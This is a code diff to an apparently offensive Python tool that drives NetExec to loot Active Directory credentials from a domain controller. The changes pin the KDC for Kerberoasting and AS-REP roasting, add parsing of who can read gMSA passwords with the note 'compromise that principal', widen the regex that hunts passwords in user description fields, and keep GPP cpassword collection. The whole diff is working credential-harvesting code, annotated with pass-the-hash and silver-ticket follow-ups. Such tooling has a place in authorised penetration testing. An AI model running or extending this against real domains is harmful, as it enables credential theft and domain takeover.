@@ -21,12 +21,15 @@ class _AdNxc(BaseCollector):
     needs_ldap = True            # AD loot only makes sense against a DC
     proto = "ldap"
     extra: List[str] = []
+    kdc = False                  # True = pin the KDC to the target (roasting)
 
     def collect_once(self, cred: Credential) -> List[Secret]:
         bin_ = find_tool("nxc")
         if not bin_:
             return []
         cmd = [bin_, self.proto, self.host] + cred.nxc_auth_args() + self.extra
+        if self.kdc:
+            cmd += ["--kdcHost", self.host]
         res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                   raw_name=self._raw_name(cred))
         return self._parse(strip_ansi(res.output))
@@ -41,6 +44,7 @@ class _AdNxc(BaseCollector):
 
 class KerberoastCollector(_AdNxc):
     name = "Kerberoast"; proto = "ldap"; extra = ["--kerberoasting", "/dev/stdout"]
+    kdc = True
     description = "Kerberoastable SPN accounts (TGS hashes)"
 
     def _parse(self, out: str) -> List[Secret]:
@@ -54,6 +58,7 @@ class KerberoastCollector(_AdNxc):
 
 class AsrepRoastCollector(_AdNxc):
     name = "ASREPRoast"; proto = "ldap"; extra = ["--asreproast", "/dev/stdout"]
+    kdc = True
     description = "AS-REP roastable users (no preauth)"
 
     def _parse(self, out: str) -> List[Secret]:
@@ -77,6 +82,14 @@ class GmsaCollector(_AdNxc):
                 found.append(Secret(self.host, "gMSA", m.group(1), m.group(2),
                                     Status.HASH, secret_type="nthash",
                                     notes="gMSA NT hash; PtH / silver ticket"))
+                continue
+            mi = re.search(r"Account:\s*(\S+).*no read permissions.*"
+                           r"PrincipalsAllowedToReadPassword:\s*(.+)$", msg, re.I)
+            if mi:
+                found.append(Secret(self.host, "gMSA", mi.group(1).rstrip("$"),
+                                    "", Status.INFO, secret_type="gmsa",
+                                    target=mi.group(2).strip(),
+                                    notes="readable by -> compromise that principal"))
         return found
 
 
@@ -99,19 +112,32 @@ class DescriptionsCollector(_AdNxc):
     name = "ADDesc"; proto = "ldap"; extra = ["-M", "get-desc-users"]
     description = "AD user description / password fields"
 
-    HINT = re.compile(r"(pass|pwd|cred|secret|:\s*\S{6,})", re.I)
+    HINT = re.compile(r"(pass|pwd|passwort|cred|secret|login|pw\s*[:=]|"
+                      r"[:=]\s*\S*\d\S*[A-Za-z]|!|@)", re.I)
+    NOISE = re.compile(r"built-in account|key distribution|managed service|"
+                       r"guest access", re.I)
 
     def _parse(self, out: str) -> List[Secret]:
         found = []
         for msg in self._messages(out):
-            if "description" in msg.lower() and self.HINT.search(msg):
-                found.append(Secret(self.host, "ADDesc", "", msg[:160], Status.INFO,
-                                    secret_type="description", notes="review raw file"))
+            low = msg.lower()
+            if "description:" not in low or self.NOISE.search(msg):
+                continue
+            desc = msg.split("description:", 1)[1].strip()
+            if desc and self.HINT.search(desc):
+                user = ""
+                mu = re.search(r"User:\s*(\S+)", msg)
+                if mu:
+                    user = mu.group(1)
+                found.append(Secret(self.host, "ADDesc", user, desc[:120], Status.INFO,
+                                    secret_type="description",
+                                    notes="description may hold a credential"))
         return found
 
 
 class GppCollector(_AdNxc):
     name = "GPP"; proto = "smb"; extra = ["-M", "gpp_password"]
+    needs_ldap = True
     description = "SYSVOL GPP cpassword (Groups.xml etc.)"
 
     def _parse(self, out: str) -> List[Secret]:
